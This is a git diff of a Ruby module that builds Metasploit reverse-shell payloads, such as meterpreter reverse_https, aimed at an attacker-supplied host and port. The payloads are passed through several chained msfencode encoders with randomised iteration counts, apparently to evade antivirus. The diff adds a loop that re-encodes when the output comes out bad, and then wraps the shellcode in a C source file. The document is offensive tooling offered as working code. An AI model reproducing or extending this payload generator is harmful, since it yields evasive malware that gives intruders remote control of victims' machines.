@@ -140,20 +140,28 @@ module Lib_meta
 		end
 
 		# Create msfpayload command
-		build = "msfpayload #{payload} LHOST=#{lhost} LPORT=#{lport} "
-		build << "SessionCommunicationTimeout=600 " if payload.eql? 'windows/meterpreter/reverse_https'
+		base_build = "msfpayload #{payload} LHOST=#{lhost} LPORT=#{lport} "
+		base_build << "SessionCommunicationTimeout=600 " if payload.eql? 'windows/meterpreter/reverse_https'
 		enumber = Random.rand(9 + 3)
-		build << "EXITFUNC=thread R |msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"
-	#	enumber = Random.rand(9 + 3)		
-		build << "msfencode -e x86/jmp_call_additive -c #{enumber} -t raw |"
-	#	enumber = Random.rand(9 + 3)
-		build << "msfencode -e x86/call4_dword_xor -c #{enumber} -t raw |"
-	#	enumber = Random.rand(9 + 3)
-		build << "msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"	
-		build << "msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX"	
+		base_build << "EXITFUNC=thread R |msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"
+		enumber = Random.rand(9 + 3)		
+		base_build << "msfencode -e x86/jmp_call_additive -c #{enumber} -t raw |"
+		enumber = Random.rand(9 + 3)
+		base_build << "msfencode -e x86/call4_dword_xor -c #{enumber} -t raw |"
+		enumber = Random.rand(9 + 3)
+		base_build << "msfencode -e x86/shikata_ga_nai -c #{enumber} -t raw |"	
+		base_build << "msfencode -a x86 -e x86/alpha_mixed -t raw BufferRegister=EAX"	
 		
+		build = ""
+
 		# Execute and return payload
-		capture_stderr('/dev/null') { build = `#{build}` }
+		capture_stderr('/dev/null') { build = `#{base_build}` }
+
+		# Check if encodings worked, if not redo
+		while build.eql? "PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIAA"
+			print_error("Bad encoding, re-encoding...")
+			capture_stderr('/dev/null') { build = `#{base_build}` }
+		end
 
 		# Build C file
 		frame = "#include <sys/types.h>\n#include <stdio.h>\n#include <string.h>\n"
